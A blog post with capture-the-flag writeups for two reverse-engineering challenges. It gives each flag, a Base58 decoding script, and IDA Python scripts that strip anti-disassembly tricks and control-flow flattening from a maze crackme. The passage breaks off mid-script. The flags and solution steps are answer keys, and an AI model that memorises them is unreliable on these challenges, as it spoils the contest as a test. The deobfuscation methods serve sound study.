---
title: TSCTF-J 2026重生之我有溜溜梅系统
date: 2026-10-26 19:20:18
tags: 
    - CTF
    - WriteUp
excerpt: 我用溜溜梅肘了新生赛.
---

# base_family Writeup

用chat做的.被那个函数指针坑了一轮,解出了假flag.

- 分类：reverse
- flag：`TSCTF-J{b4se58_1s_7he_r34l_de4l}`

## 思路

1. 输入流程：`puts("Welcome to base_family!")` → `printf("Please input your answer: ")` → `scanf("%99s")` → `strlen` → 从 `.data:0x4000` 取出函数指针**间接调用** `fp(input, len)`；只有返回值等于 1 才打印 `Correct!!!You got it!`，否则打印 `Wrong,please try again` 并 `system("pause")`。关键点在于：判定逻辑不在 main 里，而在这根被间接调用的函数指针上。
2. 该函数指针在文件里（`.data:0x4000`）的初值是 `74 16 00 40 01 00 00 00`，即 `0x140001674` —— 指向 base64 判定函数（RVA 0x1674）。它用 `.rdata:0x5078` 的 64 字符表 `0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_-`（数字在前的 base64 变体，末尾两个替换字符是 `_` 与 `-`）把输入编码，再与 `.rdata:0x5100` 的常量串做比较。但它命中时返回 **2**，而 main 只认 **1**，所以这条线即使输入正确也注定打印 `Wrong`。
3. 反汇编 RVA 0x1480 处有一段改写函数指针的例程，它做两件事：用 `0xdeadbeef12345678` **连续异或两次**的障眼写法（`addr ^ k ^ k`，代数值还原为原地址，静态看不出来）算出 base58 判定函数的地址（RVA 0x192f），再把结果写回 `.data:0x4000`。所以在运行时，`0x4000` 处保存的是 base58 判定函数的地址。
4. 该改写例程被登记在 `.rdata:0x56b0` 的全局构造函数表（CRT 初始化数组）里，表项形如 `{-1, 0x140001480, 0x140003030, 0}`（image base `0x140000000`，第二项即改写例程 `0x140001480`）。全局构造函数在 `main` **之前**执行，因此真正被 `fp` 调用的是 base58 判定函数；base64 那条链只是留在文件里的静态残留，不会被走到。
   - 静态自证：`.data:0x4000` 初值 `74 16 00 40 01 00 00 00` = `0x140001674`（base64 函数），构造函数表首项里也确实出现 `80 14 00 40 01 00 00 00` = `0x140001480`（改写例程），两者互相印证“初值是 base64、运行时被改成 base58”。
5. base58 判定函数的逻辑：把 `.rdata:0x50c0` 起的 **44 字节**常量逐字节异或 `0x26`，得到 Base58 目标串 `6gAtKazuEXraUFwyjrMbJbDSw4xUqwBa3T8uLi41uoQG`；再用**标准 Base58 字母表** `123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz` 编码输入（该字母表在栈上是逐字符异或 `0x04` 混淆后还原的），最后 `strcmp` 比较，相等才返回 1。
6. 因此真正的解码链只有一条：**常量逐字节异或 0x26 → 得到 Base58 目标串 → 标准 Base58 解码**，解出来的就是 flag。注意 44 字节常量与 `.rdata` 的对应关系：`.rdata` VA 0x5000、文件偏移 0x2800，所以 `.rdata:0x50c0` 就是文件偏移 0x28c0，可以在 exe 里逐字节核对。
7. 诱饵说明：base64 那条链（`.rdata:0x5078` 变体字母表 + `.rdata:0x5100` 常量）解出的是 `TSCTF-J{Haha_y0u_ar3_trick3d_by_b64}`，它**永远不会被接受**。原因就是第 2～4 步：base64 判定函数命中时只返回 2，与 main 的 `cmp eax,1` 不符；而且 `.data:0x4000` 处的函数指针已被全局构造函数在 main 之前改写为 base58 判定函数的地址，实际被调用的根本不是 base64 判定函数。所以对输入 `TSCTF-J{Haha_y0u_ar3_trick3d_by_b64}` 提交只会得到 `Wrong`。

## EXP

```python
# -*- coding: utf-8 -*-

# 从反汇编中提取的目标数据，异或 0x26 后得到 Base58 字符串
unk = bytes([
    0x10, 0x41, 0x67, 0x52, 0x6D, 0x47, 0x5C, 0x53, 0x63, 0x7E,
    0x54, 0x47, 0x73, 0x60, 0x51, 0x5F, 0x4C, 0x54, 0x6B, 0x44,
    0x6C, 0x44, 0x62, 0x75, 0x51, 0x12, 0x5E, 0x73, 0x57, 0x51,
    0x64, 0x47, 0x15, 0x72, 0x1E, 0x53, 0x6A, 0x4F, 0x12, 0x17,
    0x53, 0x49, 0x77, 0x61
])

target = ''.join(chr(b ^ 0x26) for b in unk)

# 标准 Base58 字母表
ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

def b58decode(s: str) -> bytes:
    n = 0
    for ch in s:
        n = n * 58 + ALPHABET.index(ch)

    # 转成字节序列（大端）
    res = []
    while n > 0:
        res.append(n & 0xFF)
        n >>= 8
    res.reverse()

    # 处理前导 '1'，每个 '1' 代表一个 0x00 字节
    pad = 0
    for ch in s:
        if ch == '1':
            pad += 1
        else:
            break

    return b'\x00' * pad + bytes(res)

flag = b58decode(target).decode()
print(flag)
# Base58 目标串: 6gAtKazuEXraUFwyjrMbJbDSw4xUqwBa3T8uLi41uoQG
# TSCTF-J{b4se58_1s_7he_r34l_de4l}
```

<div class="pagebreak"></div>

# MazeGarden Writeup

agent做题,但是修了main的一部分花指令,尝试了D-810但是完全不好使还得靠agent写的反平坦化,后面解迷宫的部分就力竭了.

- 分类：reverse
- 附件：MazeGarden.exe
- flag：`TSCTF-J{4aa31ef69b3650c20778cb5254667c74}`

## 思路

1. 入口 `main` = `0x140001000`–`0x140003FD7`（size `0x2FD7`，约 2,639 条指令）。它被 OLLVM 风格的控制流平坦化包裹：
   - 状态单元是 `[rsp+0x98]`（IDA 记作 `var_7A0`，32 位），它的地址被放在 `[rsp+0x3A0]`（`var_498`）里；
   - 初始化在函数最前面：`0x140001026 mov [rsp+3A0h], rax`（存状态地址）、`0x140001035 mov [rsp+98h], eax`（写初始状态 `0x5CE15A86`，该常量在 `0x14000101A` 由 `mov dword [rsp+3ACh], 5CE15A86h` 种下）；
   - 分发器头是 `0x14000102E`（`mov eax,[rsp+3ACh]` 起的那条链），每个检查的形态是 `mov eax,[rsp+98h]` + `sub eax,K` + `jz block` + `jmp short $+2`，共 **164** 条这样的比较，它们把 `state−K==0` 的分支指向各自的块；
   - 分发器出口是 `0x140003FD2: jmp loc_14000102E`（原字节 `e9 57 d0 ff ff`），所有块尾都跳回它。
   用这两张表（`K → block` 来自 `sub eax,K / jz T`，`block → K'` 来自块尾 `mov dword [rax],K'`）可以把状态机完整还原：**165 个状态 ↔ 165 个基本块，双射**，入口状态 `0x5CE15A86` → 入口块 `0x140001D1E`（这条检查落在 `0x140001B18: sub eax, 5CE15A86h ; jz 140001D1Eh`），165 个块全部可达，分发器链以外没有别的入口。

2. 另一个 44 KB 的平坦化函数 `sub_140004230`（`0x140004230`–`0x14000EFBF`，size `0xAD8F`）负责在启动时“种”出迷宫；`main` 一进来就调用它，胜利后再打印 flag。它自己也是同一个状态机风格（状态单元 `[rsp+0xD24]`，缓存 `[rsp+0xCE4]`，指针 `[rsp+0xD18]`，只有 11 个状态）。由于它的逻辑可以完全静态重建（见第 11–13 步），解题不需要把它也反编译出来。

3. 让 Hex-Rays 先能对 `main` F5，必须先修帧——报错码是 `-9 = MERR_HUGESTACK`（“栈帧太大”）。这个报错并不表示帧真的大，而是微码里出现了落在函数帧之外的栈引用，成因有三个，互相独立：
   - `func_t.frsize` 被篡改：真实帧是 `sub rsp, 7F8h` 加 8 个被保存的寄存器，所以 `frsize = 0x7F8`；被篡改后 `frsize` 是混淆器常数 `0x72B7AE9C`（`sub_140004230` 上是 `0x74B79218`，真实值 `0xD48` = `sub rsp,0D30h` + 3 次 push）。用 `set_frame_size_ea(ea, size, 0, 0)` 改回；同时必须清掉 `func_t.flags` 里的 `FUNC_FAR(0x2)`，否则 x64 下 `retsize` 被算成 16，报 `-13 = MERR_BADFRAME`，清掉后 `retsize` 回到 8。
   - 死块里埋了 6 处假返回：`0x140001F72 retn`、`0x1400029E4 retf`、`0x140002A57 retf`、`0x140002F4A retn`、`0x1400030FA retf`、`0x140003D5B retn`（另有 `0x14000259E retn 40Eh`、`0x140002F63` 也在死代码里，未处理）。IDA 把任何 `ret` 当成函数出口，于是强制 `spd` 归零，制造出 `(spd=-2104) → ret → spd=0 → 下一条 spd=-2104` 的假摆动，反编译器据此以为帧巨大。处理：对这 6 处 `del_items(DELIT_SIMPLE)` 撤销即可。
   - 反汇编垃圾 `0x1400022E9` 解出一条荒谬的 `rsp` 引用：`shr [rsp+rdx+838h+var_72B7AE9B], 1`，栈偏移约 `-1949657187`。真实指令流应从 `0x1400022EE` 重新对齐（`lea rax, [rsp+838h+var_468]`，随后 `0x1400022F6` 是 `add rax, 18h`）：撤销 `0x1400022E9` 的 7 个字节，在 `0x1400022EE` `create_insn` 重建代码。
   另有两条不碰 `rsp`、但 SIB 编码让 IDA 算出假偏移的垃圾指令 `0x1400038E4`、`0x1400038F3`，各自撤销 4 字节。

4. `EB FF` 是“跳到自己第二个字节”的重叠指令：`EB FF` = `jmp short $+2`，落点是自身第二字节 `FF`，于同一字节被要求既是位移又是下一条指令的操作码——IDA 不支持重叠指令，解码流就此中断。整个 `main` 里这样的位置有 **20** 处（`0x140001F70 0x140002610 0x14000281F 0x1400029AA 0x140002A3F 0x140002A55 0x140002E7B 0x140002F48 0x1400030CF 0x1400030F8 0x140003218 0x1400032B2 0x1400032DE 0x140003787 0x140003B84 0x140003D59 0x140003DE0 0x140003E1F 0x140003E22 0x140003FB9`），逐字节把 `EB` 改成 `90`（即 `EB FF → 90 FF`），让 `FF` 成为下一条指令的正常起始。

5. 还剩一个假条件分支：`0x1400027B4` 原字节 `79 09 99`（`jns +9` / `cdq`），它紧跟在 `0x1400027B0 cmp esi, esi` + `0x1400027B2 jz loc_1400027BB`（必然跳转）之后，位于死块中且干扰解码，改写成 `90 90 90`。

6. 最后一个 `JUMPOUT` 来自“同一段字节的两种读法”。字节现场（从 `0x140002EB7` 起）：

   ```
   E9 16 11 00 00 | 48 8B 84 24 20 02 00 00 | 48 8B 8C 24 18 02 00 00 | 48 89 08 | 31 C0 | 74 03 | AA | BA 17 | ...
   ```

   | 读法 | 指令头 | 解码 | 长度 | 入口来源 |
   |---|---|---|---|---|
   | A（顺序流） | `0x140002ECC` | `48 89 08` = `mov [rax], rcx` | 3 | `0x140002EC4` 的顺序流 |
   | B（诱饵分支） | `0x140002ECD` | `89 08` = `mov [rax], ecx`（32 位截断） | 2 | `0x140002EF1` 的 `jo short loc_140002ECD` |

   IDA 当时信了 B，于是 `0x140002EC4` 的顺序流落到非指令地址，Hex-Rays 报 `JUMPOUT(0x140002ECCLL)`。判定 B 是假的有两条独立证据：
   - 可达性：`0x140002EE9 xor ebx, ebx`（ZF=1 必然）后接 `0x140002EEB jz short loc_140002EF4`（`74 07` 恰好跨过 `0x140002EED..0x140002EF3`），所以 `0x140002EF1` 的 `jo` 是永远走不到的死边，`0x140002ECD` 那条入口是诱饵；
   - 语义自证：`0x140002EA1` 把指针存进 `var_620`，`0x140002EC4` 用 64 位把它读回 `rcx`，那么 `0x140002ECC` 必须是 64 位存 `mov [rax], rcx`，读法 B 的 32 位截断会丢高位。
   处理：把死块 `0x140002EED..0x140002EF3`（原字节 `4B 8B EC F8 45 70 D9`）撤销为数据，诱饵 `jo` 随之消失；顺序流读到 `0x140002ECC` 时自然立起真指令头 `48 89 08`，并与后续 `31 C0` / `74 03` / `AA` 完美衔接。注意**不要**用“在目标地址 Undefine 再在下一位 MakeCode”的粗暴做法——那会把 REX 前缀 `0x48` 变成断头字节，正是错误读法 B 的成因。
   修完 F5 成功：错误码 0，伪代码 160,308 字符，`JUMPOUT` 0 次，提示串可见；`main` 内共 23 处补丁字节 = 20×(`EB→90`) + 3×(`79 09 99→90 90 90`)。

7. 帧修好后 `main` 能反编译，但还是一坨 `switch(state)`。下一步做**字节级去平坦化**：不改语义、不靠额外的反混淆器，直接把“写状态 + 跳回分发器”的块尾改写成“直接跳到后继块”，让控制流图在字节层面就是平的。三类改写：
   - **单后继块（130 个）**。原始块尾：

     ```
     P: mov rax, [rsp+838h+var_498]   ; 8 字节  48 8b 84 24 a0 03 00 00
     S: mov dword ptr [rax], K'       ; 6 字节  c7 00 + imm32（或 mov [rax],ecx，2 字节 89 08）
     [X: 可能存在的真实代码，例如 0x140001F24 块尾那三条 al 运算]
     J: jmp loc_140003FD2             ; 5 字节  e9 rel32（或 2 字节 eb rel8）
     ```

     改写为：NOP 掉 `P`、`S`（状态不再需要），把 `J` 原地改成 `jmp block(K')`；`X` 一律保留。若 `J` 是 2 字节 `EB` 且 `J+2` 恰好就是目标块（`0x140003EC4` → `0x140003FB9`），连 `J` 一起 NOP，直接落空过去。仅当某块没有安全方案时才整体拒绝执行。
   - **条件块（34 个）**。原始块尾：

     ```
     M1: mov <reg1>, K1               ; K1 = 条件不成立时的状态
     M2: mov <reg2>, K2               ; K2 = 条件成立时的状态
     T : test/cmp ...                 ; 置标志
     C : cmov<cc> reg1, reg2          ; 3 字节 0f 4x modrm
     P : mov rax, [rsp+838h+var_498]
     S : mov [rax], reg1
     [X: 如 mov byte ptr [rsp+838h+var_79A], 0]
     J : jmp loc_140003FD2
     ```

     改写为：在 `C` 处写下 `0F 8x rel32 -> block(K2)`（x86 的 jcc 与 cmov 共用条件码，所以 `x` 直接抄 `cmov` 的低 4 位）、紧跟 `E9 rel32 -> block(K1)`（条件不成立落到 K1），其余用 NOP 填满 `[C, J_end)`。`T` 紧贴在 `C` 前面、中间只有 `mov`，所以标志位在 `C` 处仍然有效。若存在 `X`（2 个块），把它的字节原样搬到分支之前——`X` 是 `mov byte [rsp+…], imm` 型纯存储，不影响标志位，且必须两条路径都执行，只能前置。极性规则：`cmovcc dst=K1, src=K2` ⇒ `jcc` 成立时取 K2，否则取 K1；同时校验 `M1/M2` 是 `B8+r` 形态的 `mov r32,imm32`、`cmov` 的 modrm 里目的/源寄存器与 `M1/M2` 完全对应、`K1/K2` 都在状态表里、`cmov` 紧跟标志设置指令。
   - **入口（1 处）**：`0x14000102E`（`mov eax,[rsp+838h+var_48C]`，7 字节）改成 `E9 rel32 -> 0x140001D1E` + 2×NOP。之后 `0x140001036`–`0x140001D1E` 那段分发器链完全不可达（可达指令数为 0）。

8. 样本里还散布着大量“跳转跨过的垃圾”，判别出三类**必然跨过**的形态后统一 NOP（共 **66** 段）：
   - 无条件 `jmp` 跨过的区间；
   - `xor r,r` / `cmp r,r` / `sub r,r`（恒 ZF=1、CF=0）之后恒真的 `jcc` 跨过的区间；
   - 互补 `jcc` 对（`jl`/`jge`、`jb`/`jnb`、`jz`/`jnz`…，条件码按位取反）跳到同一目标，因而中间字节必死。
   并附加安全条件：区间长度 ≤ 64 字节，且区间内不得出现**来自守卫对之外**的任何控制流目标、命名符号或交叉引用（逐个目标扫 xref，来源必须落在守卫对范围内）。
   这批 NOP 顺手清掉了 `retf`（`0x1400029E4`，正是 `FUNC_FAR` 反复复发的根因）、`pop rdx`/`pop rbp`/`push rbp`/`xchg`/`abort` 等会干扰 sp 分析的垃圾。

9. 去平坦化后重新解码 `main` 做机械校验：对 165 个块逐个比较**块间后继集合**与原始状态机的后继集合，结果 **164/164 完全一致**（终止块 1 个）。其中 163 个块新写的 `jcc`/`jmp` 目标等于原 `cmovcc`/常量推出的后继集合；打印 flag 的那个块（`0x140003EC4`）改成落空进 `0x140003FB9`，语义等同原来的 `jmp short`；终止块 `0x140003FB9` 以真实 `retn`（`0x140003FD1`）收尾。伪代码长度从 160,081 字符降到 **8,223** 字符，`switch` 分发器消失，`while ( 1 )` 从嵌套 15 层变成 1 层（真实主循环），`JUMPOUT` 仍为 0。跨块通信只走栈（`var_XXX`）、不依赖寄存器，这是“块尾直跳”能保持语义的前提，已逐块核实。
    中途出现过的 `posivive sp value has been detected` 警告也查明并消除了：微码层 `mba_t.has_bad_sp` / `bad_call_sp_detected` 为真，说明是**调用**的 sp 不一致；把 `0x140001D57` 的 `call sub_140004230` 临时 NOP 成 5 个 `90` 后警告立刻消失、还原后重现，根因就是被调函数 `sub_140004230` 的帧/sp 不一致。清掉全库唯一残留在 `sub_140004230` 上的 `FUNC_FAR` 并重解析后，`main` 的警告不再出现（最终 `positive_sp=False`）。

10. 迷宫数据结构放在 `main` 栈上的 `rsp+0x3D0`，由 `sub_140004230` 填充：

    | 偏移 | 值 | 含义 |
    |---|---|---|
    | `+0x00` | `0x29` (41) | 迷宫宽度/行跨度 W |
    | `+0x08` | 5 | 层数 L |
    | `+0x10` | `alloc(0x20D6)`（8406 B = 205×41+1） | 地图缓冲 |
    | `+0x18` / `+0x20` / `+0x28` | 1 / 1 / 0 | 起点 (x, y, z) |
    | `+0x30` | 0 | 按键历史长度 |
    | `+0x38` | 1004 B 缓冲 | 按键历史，就是要被 MD5 的字符串 |

11. 地图索引 `idx = x + 41*y + 41*41*z`，即 **5 层 × 41 行 × 41 列**；字符含义：`#` 墙、` ` 通路、`^` 上行梯、`v` 下行梯、`X` 上下皆可。起点 (1,1,0)（该格本身就是 `'v'`，开局即可下楼），终点 (39,39,4)。胜利判定 `x == W-2 (=39) && y == x && z == L-1 (=4)`，且胜利前的循环里没有任何输出。

12. 按键只有 6 个，全部在 `main` 里逐条从反编译确认：
    - `a` / `d`：x ∓ 1；目标格不是 `#` 才移动，是墙则移动失败、状态不变；
    - `w` / `s`：y ∓ 1；同样判墙；
    - `i`：z − 1，要求**当前格**是 `^` 或 `X`；
    - `k`：z + 1，要求**当前格**是 `v` 或 `X`。
    其它任何字节（包括回车与 EOF 的 −1）全部忽略。

13. 地图不是编在代码里的常量，而是运行时从 `.rdata` 的一张行表“种”出来的：`0x140027388` 起有 **391** 条 41 字符的行字符串，每条后面跟 `\0`（步长 42）。`sub_140004230` 中有 **410** 个 `memcpy(dst, row, 41)` 站点，每个站点的字节特征是 `41 B8 29 00 00 00`（`mov r8d, 0x29`），站点 0 在 `0x140004484`、站点 409 在 `0x14000EF42`；每个站点用 `lea` 取行号、并都有一个 `dest_row`，实际拷贝的目标偏移是 `41 * dest_row`。
    站点把目标行号算成 `dest_row = s_n − K_n (mod 2^32)`，其中 `s_n` 是 PRNG 状态、`K_n` 是代码里用 8 种不同混淆写法藏起来的常数（`sub eax,K` / `sub edx,K` / `and|xor r8d,M` / `mov r8,imm64` / `mov rcx,imm64` / `sub A; sub B; add A` …）。
    那个 PRNG 是 `sub_140004180`，直接看它的机器码就能认出是 LCG：先从 `0x140036000` 读种子（`0x12345678`，`.data`）；然后 `mov r8d, 0FFFFFFFFh` / `and r8d, 0DEADBEEFh` 把乘数取成 `0xDEADBEEF`；再用 `(x & M) * (x | M) + (x & ~M) * ~(~x | M) = x * M` 这个恒等式配 `0xCAFEBABE` 混淆，最终等价于

    ```
    s = (0xDEADBEEF * s + 0xCAFEBABE) mod 2^32
    ```

    每个站点的 `lea` 行号与 `K_n` 一一对应，所以可以完全静态重建地图，不需要真的把程序跑起来。

14. 410 个站点分成两条互斥的拷贝路径，互为诱饵。`sub_140004230` 的状态机只有 11 个状态，其中 block B 的尾部做条件选路：`mov edx, eax ; cmp edx, 0 ; cmovnz ecx, eax`，于是 `ecx = 0x63B6EDA9` 走 block D（`0x140009B49`，真正的 205 次拷贝），`eax = 0xBF2E7551` 走 block C（`0x140004447`，诱饵）。block C 在拷完**第 1 行**之后就把状态写成 `0xDD3803B0`，而该状态在分派链里直奔 epilogue（`0x14000EFAF: add rsp, 0D30h ; ... ; retn`）⇒ C 路径只拷 1 行就返回，是死路。因此实际执行的是 D→E→F 这条路，即站点 **205..409**，正好 205 次拷贝 = 205 行地图；LCG 从种子重新开始，`dest` 排列与另一条路完全相同，但**源行**不同。

15. 真实地图的源行 = 表行 **196..390**（195 行）再加 **row 8**（被复用 10 次），合计 205 行、196 个不同表行。`row 8` 是整行 `#`（41 个 `#`），它被复制的 10 次恰好落在 5 层的 10 条边界行 `{0, 40, 41, 81, 82, 122, 123, 163, 164, 204}` —— 这条强校验证明了行对齐与排列都正确（行号 0 和 40 分别是第 1 层的上下边界，41/81 是第 2 层，依此类推）。验证脚本里对这张 205 项的源行表有两条断言：长度必须为 205，且值为 8 的位置必须正好是那 10 个边界行。
    最初按“站点 0..204 + LCG 连续”重建得到的是诱饵地图 A：它同样是一棵结构完美的树（3801 点 / 3800 边），也能 BFS 出一条 1080 步的路径，但喂给 exe 不会获胜——因为它对应的是诱饵路径 C。改用 D 路径的真实源行后，324 步路径一次通过。

16. 该图为**树**：3798 个非墙格、3797 条边（边数 = 点数 − 1，且从起点可达全部 3798 格），所以起点 (1,1,0) → 终点 (39,39,4) 的简单路径唯一。BFS 求这条路径得 **324** 步。

17. 按键历史对相邻互逆键（`a↔d`、`w↔s`、`i↔k`）做自由群约化：每次成功移动时，若历史非空且栈顶恰好是当前键的逆键就弹出栈顶，否则压入当前键。树上的简单路径不含互逆对，所以约化后与原始路径完全相同，flag 唯一。

18. 胜利后 `v132[v131] = 0` 结束按键串，调用 `sub_140010A10(key, out16, ...)`（调用点 `0x140003E39`）做标准 MD5：IV = `67452301 / efcdab89 / 98badcfe / 10325476`，T 表在 `0x140036110`（首项 `0xd76aa478`，与标准 MD5 常量表一致），左移量表的 16 项在 `0x140036010`（`7, 12, 17, 22, 7, 12, 17, 22, …`）。16 字节结果落在 `[rsp+0x3B8]`（伪代码里的 `v116`/`v117`…`v123`）。

19. 最后 printf 包装 `sub_140003FE0` 用提示串

    ```
    Congratulations! The flag is: TSCTF-J{%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x}
    ```

    （在 `.rdata` 的 `0x140027320`）把这 16 个字节打出来。即 `flag = MD5(324 字节获胜按键序列)`，MD5 结果就是 `4aa31ef69b3650c20778cb5254667c74`。

20. 顺带说明两个容易误判的现象：不喂输入时程序静默空转（`fgetchar()` 一直返回 EOF 而循环不判断，CPU 占满），这是题目设计而不是环境问题；喂完数据后如果不关 stdin，程序也不会退出，验证脚本必须设超时兜底。

## EXP

### 1. 修 `main` 的帧与伪指令，使 Hex-Rays 能 F5

```python
import ida_auto
import ida_bytes
import ida_frame
import ida_funcs
import ida_hexrays
import ida_idaapi
import ida_range
import ida_ua
import idc

MAIN_EA = 0x140001000
MAIN_FR_SIZE = 0x7F8             # `sub rsp, 7F8h` + 8 个被保存寄存器
SUB_140004230_EA = 0x140004230
SUB_140004230_FR_SIZE = 0xD48    # `sub rsp, 0D30h` + 3 次 push

# 死块里的 6 处假返回（ret 会强制 spd=0，制造假帧摆动）
FAKE_RETS = (
    0x140001F72,  # retn
    0x1400029E4,  # retf
    0x140002A57,  # retf
    0x140002F4A,  # retn
    0x1400030FA,  # retf
    0x140003D5B,  # retn
    # 0x14000259E (retn 40Eh) 与 0x140002F63 也躺在死代码里，未处理
)

# 反汇编垃圾解出假的大 rsp 引用：(坏指令地址, 其长度, 正确指令边界)
REALIGN = (
    (0x1400022E9, 7, 0x1400022EE),
)

# SIB 编码让 IDA 算出假偏移、但从不碰 rsp 的垃圾指令：(地址, 长度)
JUNK_SIB = (
    (0x1400038E4, 4),
    (0x1400038F3, 4),
)

BADADDR = ida_idaapi.BADADDR


def next_head(ea):
    return idc.next_head(ea, idc.get_segm_end(ea))


def decode(ea):
    insn = ida_ua.insn_t()
    if ida_ua.decode_insn(insn, ea) and insn.size > 0:
        return insn
    return None


def main_func():
    return ida_funcs.get_func(MAIN_EA)


def microcode_code(ea):
    """Hex-Rays 的失败码（0 == ok，-9 == MERR_HUGESTACK，-13 == MERR_BADFRAME）。"""
    f = ida_funcs.get_func(ea)
    if f is None:
        return None
    rng = ida_hexrays.mba_ranges_t()
    rng.ranges.push_back(ida_range.range_t(f.start_ea, f.end_ea))
    fail = ida_hexrays.hexrays_failure_t()
    mba = ida_hexrays.gen_microcode(
        rng, fail, None, ida_hexrays.DECOMP_NO_WAIT, ida_hexrays.MMAT_ZERO
    )
    return 0 if mba is not None else fail.code


def fix_frame_size(ea, size):
    """Step 1：恢复真实帧尺寸；frsize 被改成 0x72B7AE9C 会报 -9，带 FUNC_FAR 会报 -13。"""
    f = ida_funcs.get_func(ea)
    if f is None:
        return False
    if f.frsize == size and f.frregs == 0 and f.argsize == 0:
        return True
    if not ida_frame.set_frame_size_ea(ea, size, 0, 0):
        return False
    return ida_funcs.get_func(ea).frsize == size


def strip_fake_rets():
    """Step 2：撤销 6 处假返回。"""
    for ea in FAKE_RETS:
        insn = decode(ea)
        if insn is None:
            continue
        if not idc.print_insn_mnem(ea).startswith("ret"):
            continue
        ida_bytes.del_items(ea, ida_bytes.DELIT_SIMPLE, insn.size)
    ida_auto.auto_wait()


def realign_junk():
    """Step 3：把 `shr [rsp+rdx+838h+var_72B7AE9B],1` 这段垃圾撤销，在正确边界重建代码。"""
    for ea, size, real in REALIGN:
        line = idc.generate_disasm_line(ea, 0)
        if "rsp" not in line or "72B7AE9B" not in line:
            continue
        ida_bytes.del_items(ea, ida_bytes.DELIT_SIMPLE, size)
        if not ida_ua.create_insn(real):
            for delta in range(1, 10):
                cand = real + delta
                if ida_bytes.is_code(ida_bytes.get_flags(cand)):
                    break
                if ida_ua.create_insn(cand):
                    break
    ida_auto.auto_wait()


def strip_junk_sib():
    """Step 4：撤销带假 SIB 偏移的垃圾指令。"""
    for ea, size in JUNK_SIB:
        if decode(ea) is None:
            continue
        ida_bytes.del_items(ea, ida_bytes.DELIT_SIMPLE, size)
    ida_auto.auto_wait()


def verify_and_save(verbose=True):
    """Step 5/6：微码必须成功、frsize 必须正确、F5 必须出伪代码，然后才写库。"""
    f = main_func()
    if f is None:
        return False
    if f.frsize != MAIN_FR_SIZE:
        return False
    if microcode_code(MAIN_EA) != 0:
        return False
    ida_hexrays.clear_cached_cfuncs()
    cf = ida_hexrays.decompile(MAIN_EA)
    if cf is None:
        return False
    if verbose:
        txt = str(cf)
        print("[fix] main %X-%X frsize=%#x flags=%#x" %
              (f.start_ea, f.end_ea, f.frsize, f.flags))
        print("[fix] pseudocode len=%d  JUMPOUT=%d  flagstr=%s" %
              (len(txt), txt.count("JUMPOUT"), "TSCTF-J{" in txt))
    idc.save_database(BADADDR, 0)
    return True


def fix_main():
    fix_frame_size(MAIN_EA, MAIN_FR_SIZE)
    fix_frame_size(SUB_140004230_EA, SUB_140004230_FR_SIZE)
    strip_fake_rets()
    realign_junk()
    strip_junk_sib()
    return verify_and_save()


# ---- 只改 `get_byte` 看到的字节（IDB 内补丁），随后重新解码
def patch_bytes(ea, data):
    for i, b in enumerate(data):
        ida_bytes.patch_byte(ea + i, b)


EB_FF_SITES = (
    0x140001F70, 0x140002610, 0x14000281F, 0x1400029AA, 0x140002A3F, 0x140002A55,
    0x140002E7B, 0x140002F48, 0x1400030CF, 0x1400030F8, 0x140003218, 0x1400032B2,
    0x1400032DE, 0x140003787, 0x140003B84, 0x140003D59, 0x140003DE0, 0x140003E1F,
    0x140003E22, 0x140003FB9,
)
FAKE_BRANCH = 0x1400027B4       # 原 79 09 99（jns +9 / cdq），在恒跳之后
DEAD_EDGE = (0x140002EED, 0x140002EF3)   # 死块：4B 8B EC F8 45 70 D9，含诱饵 `jo`


def fix_fake_instruction_stream():
    """`EB FF`（跳到自己第二字节的重叠指令）→ `90 FF`，共 20 处。"""
    for ea in EB_FF_SITES:
        if ida_bytes.get_bytes(ea, 2) == b"\xeb\xff":
            patch_bytes(ea, b"\x90\xff")
    """假条件分支 `79 09 99` → `90 90 90`。"""
    if ida_bytes.get_bytes(FAKE_BRANCH, 3) == b"\x79\x09\x99":
        patch_bytes(FAKE_BRANCH, b"\x90\x90\x90")
    """撤销死块 0x140002EED..0x140002EF3，让 0x140002ECC 立起真指令头 48 89 08。"""
    lo, hi = DEAD_EDGE
    ida_bytes.del_items(lo, ida_bytes.DELIT_SIMPLE, hi + 1 - lo)
    ida_auto.plan_and_wait(MAIN_EA, 0x140003FD7)
    ida_auto.auto_wait()
```

### 2. 提取状态机 `K → block` / `block → K'`

```python
import os, re, json
from collections import Counter

import ida_bytes, ida_funcs, ida_ua, idc, ida_hexrays

OUTDIR = "."


def _insn(ea):
    i = ida_ua.insn_t()
    return i if ida_ua.decode_insn(i, ea) else None


def _is_code(ea):
    return ida_bytes.is_code(ida_bytes.get_flags(ea))


def _items(f, start=None, end=None):
    ea = f.start_ea if start is None else start
    stop = f.end_ea if end is None else end
    while ea < stop:
        sz = ida_bytes.get_item_size(ea)
        if _is_code(ea) and sz:
            m = idc.print_insn_mnem(ea)
            yield ea, sz, m, idc.generate_disasm_line(ea, 0), _insn(ea)
            ea += sz
        else:
            ea += 1


JCC = {"jz", "jnz", "ja", "jb", "jae", "jbe", "jg", "jl", "jge", "jle",
       "jo", "jno", "js", "jns", "jp", "jnp", "jrcxz", "loop", "loopne", "loope"}
CMOV = {"cmovz", "cmovnz", "cmova", "cmovb", "cmovae", "cmovbe", "cmovg",
        "cmovl", "cmovge", "cmovle", "cmovo", "cmovno", "cmovs", "cmovns"}


# ---------------------------------------------- 1. 状态 <-> 基本块 映射
def build_state_map(f, verbose=True):
    checks = []            # (check_ea, K, block, jz_ea)
    for ea, sz, m, txt, insn in _items(f):
        if m != "sub" or insn is None:
            continue
        if idc.get_operand_type(ea, 1) != idc.o_imm:
            continue
        jz = ea + sz
        if idc.print_insn_mnem(jz) != "jz":
            continue
        after = jz + ida_bytes.get_item_size(jz)
        if ida_bytes.get_byte(after) not in (0xEB, 0x90):   # 分发器特征: jz 后接 jmp $+2
            continue
        tgt = idc.get_operand_value(jz, 0)
        if not (f.start_ea <= tgt < f.end_ea):
            continue
        checks.append((ea, idc.get_operand_value(ea, 1) & 0xFFFFFFFF, tgt, jz))

    K2B = {K: b for _, K, b, _ in checks}
    B2K = {b: K for _, K, b, _ in checks}

    cnt = Counter()
    for ea, sz, m, txt, insn in _items(f):
        if m == "jmp" and idc.get_operand_type(ea, 0) == idc.o_near:
            t = idc.get_operand_value(ea, 0)
            if t not in B2K:
                cnt[t] += 1
